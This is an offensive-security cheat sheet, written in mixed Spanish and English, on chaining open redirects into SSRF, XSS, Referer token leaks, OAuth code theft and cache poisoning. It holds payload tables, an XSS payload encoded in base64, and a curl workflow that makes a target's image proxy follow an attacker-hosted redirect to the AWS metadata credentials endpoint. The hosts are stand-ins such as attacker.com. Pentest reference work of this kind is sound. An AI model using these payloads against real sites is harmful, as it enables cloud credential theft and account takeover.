---
aliases:
  - Open Redirect Chain
  - SSRF via Redirect
  - XSS via Redirect
  - OAuth Code Theft
tags:
  - type/cheatsheet
  - vuln/open-redirect
  - technique/lateral-movement
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Open Redirect]]'
  - '[[Server-Side Request Forgery (SSRF)]]'
  - '[[Cross-Site Scripting (XSS)]]'
  - '[[Web Cache Poisoning]]'
---
# Open Redirect - Chains con Otras Vulns

***

## SSRF via Redirect Chain

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Server-side fetch endpoint follows redirects. App valida initial URL pero no follow chain. Atacante hostea redirect a internal IP | Bypass de SSRF whitelist. |
| Setup atacante | Atacante hostea `https://attacker.com/r` que retorna `302 Location: http://127.0.0.1/admin` | Server follows. |
| Bypass de IP allowlist | Initial validates `attacker.com` (allowed external) → redirect a internal | Blacklist bypass. |
| Cloud metadata via redirect | Redirect chain → AWS metadata endpoint | Cloud creds theft. |
| Internal port scan | Multiple redirects a distintos internal ports | Recon. |
| 308 preserves method | POST → 308 → POST a internal | Method preservation. |
| 302 strips body | POST → 302 → GET a internal | Body lost. |
| Combine con DNS rebinding | Initial DNS resolve external, second internal | Race-based bypass. |
| Time-of-check time-of-use | App validates URL, fetches later | Redirect mid-flow. |
| URL preview / image proxy | Image proxy follows redirects → SSRF | Common vector. |
| OG card generator | Open Graph fetcher follows redirects | Social platforms. |
| Webhook delivery | Webhook callback follows redirects | App-to-app. |
^or-chain-ssrf

### SSRF chain workflow

```bash
# 1. Atacante hostea redirect server
# attacker.com/r serves:
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Atacante envía URL a target image proxy
curl https://target.com/api/image-proxy?url=https://attacker.com/r

# 3. Target fetches attacker.com → follows redirect → fetches AWS metadata
# Response contains AWS credentials → theft.
```

___

## XSS via `javascript:` / `data:` URL

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | If redirect URL no validated for scheme, atacante usa `javascript:` o `data:` | Browser executes en context. |
| `javascript:` direct | `?next=javascript:alert(document.cookie)` | XSS. |
| `data:` HTML | `?next=data:text/html,<script>alert(1)</script>` | XSS via data URL. |
| `data:` base64 | `?next=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | Encoded payload. |
| Reflected en `<a href>` | App reflejas user input en `<a href="...">` con redirect | Clickable XSS. |
| Reflected en JS `location.href` | Client-side `location.href = userInput` | Direct DOM XSS. |
| Reflected en meta refresh | `<meta http-equiv="refresh" content="0;url=USER_INPUT">` | Server-side. |
| Reflected en form action | `<form action="USER_INPUT">` | Form submit XSS. |
| Modern browsers strict | Block javascript: from Location header | Some still allow. |
| iOS Safari edge cases | Different scheme handling | Mobile. |
| WebView in mobile apps | Often less strict | App-specific. |
| Combine con CSP bypass | If CSP allows `unsafe-inline` script-src | XSS chain. |
^or-chain-xss

___

## Token Leak via Referer

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Page con sensitive data en URL (token, session id). Open redirect → atacante recibe page como Referer | Cross-origin leak. |
| Reset token leak | URL `/reset?token=abc` → atacante page → Referer header reveals token | ATO chain. |
| Magic link leak | Same idea con magic links | Auth flow. |
| OAuth code leak | Code en URL → leaked to attacker | OAuth code theft. |
| Session ID leak | Session in URL (anti-pattern) → leaked | Direct ATO. |
| API key in URL | `?api_key=...` leaked via Referer | API access. |
| Filename / path leak | Sensitive paths in URL | Info disclosure. |
| Combine con CDN logs | CDN access logs include Referer | Forensics. |
| Referrer-Policy bypass | App relies on policy but fails to set | Default behavior leak. |
| HTTPS→HTTP downgrade strips | Force HTTP → no Referer | Sometimes useful pattern. |
| Combine con XSS | XSS reads document.referrer + exfil | Chain. |
^or-chain-referer

### Workflow token leak via Referer

```
1. Victim recibe email "Reset password" con link:
   https://target.com/reset?token=ABC123

2. Atacante hostea attacker.com con same domain pattern:
   https://attacker.com/welcome.html

3. Atacante envía secondary link:
   https://target.com/redirect?next=https://attacker.com/welcome.html

4. Victim sigue link reset → reset page open
5. Victim clicks otro link en reset page → redirect a attacker
6. Browser sends Referer: https://target.com/reset?token=ABC123
7. Atacante reads Referer en server logs → tiene token
8. Atacante usa token → reset password → ATO
```

___

## OAuth Code Stealing

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | OAuth Authorization Code flow. Code arrives via redirect_uri controllable → atacante recibe code → exchange por access token | OAuth ATO. |
| `redirect_uri` injection | `?redirect_uri=https://attacker.com/cb` | Standard. |
| Bypass redirect_uri whitelist | Use bypasses estándar (userinfo, encoding) | Same as Open Redirect. |
| Subdomain takeover combo | Atacante toma dead subdomain whitelisted | Ownership transfer. |
| Wildcard redirect_uri | If IdP allows `*.target.com` → atacante registra subdomain | Suffix bypass. |
| Path-based whitelist bypass | `redirect_uri=https://target.com/oauth/cb/../../redirect?url=https://attacker.com` | Chain con second OR. |
| Public client (no secret) | Code → access token sin client_secret | Public OAuth client. |
| State parameter missing | OAuth flow without state → CSRF en authz request | Combine vector. |
| PKCE missing | No `code_challenge` → atacante can use intercepted code | Modern OAuth. |
| Implicit flow direct token | `response_type=token` → access_token in fragment | Direct theft. |
| Refresh token theft | Long-lived refresh token via redirect | Persistent access. |
| Hybrid flow | `response_type=code+id_token` + multiple vectors | Complex. |
^or-chain-oauth

___

## Cache Poisoning Combo

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Open redirect controlled by header (X-Forwarded-Host) + cacheable response | Mass victim impact. |
| `X-Forwarded-Host` redirect poison | Cache stores Location: attacker.com en endpoint legitimo | Ver `Web Cache Poisoning`. |
| Login redirect cache | `/login` cacheado con malicious Location | Mass phishing. |
| Logout redirect cache | Similar | Same. |
| Auth callback cache | OAuth callback cached → mass code theft | Auth flow combo. |
| Combine con CDN config | Aggressive caching includes redirects | Multi-tier. |
| Combine con HRS | Smuggle redirect injection | Multi-vector. |
| Persistencia | TTL del cache → todos los users por TTL | Long impact. |
| Combine con Subdomain takeover | Cache poison redirect a takeover subdomain | Trust chain. |
| OAuth state CSRF + redirect cache | Force authz on victim → redirect cached | Multi-step. |
^or-chain-cache

***
